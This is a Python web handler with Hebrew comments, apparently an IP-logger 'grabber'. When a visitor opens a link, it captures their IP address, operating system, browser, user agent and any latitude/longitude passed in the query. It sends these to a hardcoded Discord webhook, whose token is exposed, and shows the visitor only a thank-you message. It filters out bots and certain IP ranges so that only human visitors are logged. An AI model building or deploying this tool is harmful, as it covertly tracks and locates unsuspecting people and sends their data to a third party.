from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path  # ✅ כדי לטעון את index.html
import json
import requests
import httpagentparser

# קונפיגורציה
config = {
    "webhook": "https://discord.com/api/webhooks/1361668974206779552/amPEf46kyp9dSU9cTzdSWw3q6l8wlyEncwKhWc0UYrm6nejcmVOvlnQb_V1IamzjpMMF",  # החלף ב-Webhook שלך
    "username": "LoggerBot",
    "color": 0x00FFFF,
    "showMessage": True,
    "messageText": "תודה שביקרת בקישור שלנו!",
    "linkAlerts": True,
    "antiBot": True
}

blacklisted_ips = ("27", "104", "143", "164")

# פונקציה לבדיקה אם זה בוט
def is_bot(ip, user_agent):
    if ip.startswith(("34", "35")) or "bot" in user_agent.lower():
        return True
    return False

# פונקציה לשליחת לוג לדיסקורד
def send_log_to_discord(data):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(config["webhook"], headers=headers, data=json.dumps(data))
    return response.status_code

# פונקציית יצירת דוח
def create_report(ip, user_agent, endpoint="/image", lat=None, lon=None):
    if any(ip.startswith(bad) for bad in blacklisted_ips):
        return

    if is_bot(ip, user_agent) and config["antiBot"]:
        return

    os, browser = httpagentparser.simple_detect(user_agent)

    location_text = ""
    if lat and lon:
        location_text = f"> **Location:** [Open in Maps](https://www.google.com/maps?q={lat},{lon})\n"

    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"""
**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip}
> **OS:** {os}
> **Browser:** {browser}
> **User-Agent:** {user_agent}
{location_text}
            """
        }]
    }

    send_log_to_discord(embed)


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')

        # ✅ אם גולש נכנס ל- / (שורש) – שלח את הקובץ index.html
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html_path = Path("index.html")
            self.wfile.write(html_path.read_bytes())
            return

        lat = query.get("lat", [None])[0]
        lon = query.get("lon", [None])[0]

        create_report(ip, user_agent, parsed_path.path, lat, lon)

        if config["showMessage"]:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(config["messageText"].encode())
        else:
            self.send_response(204)
            self.end_headers()
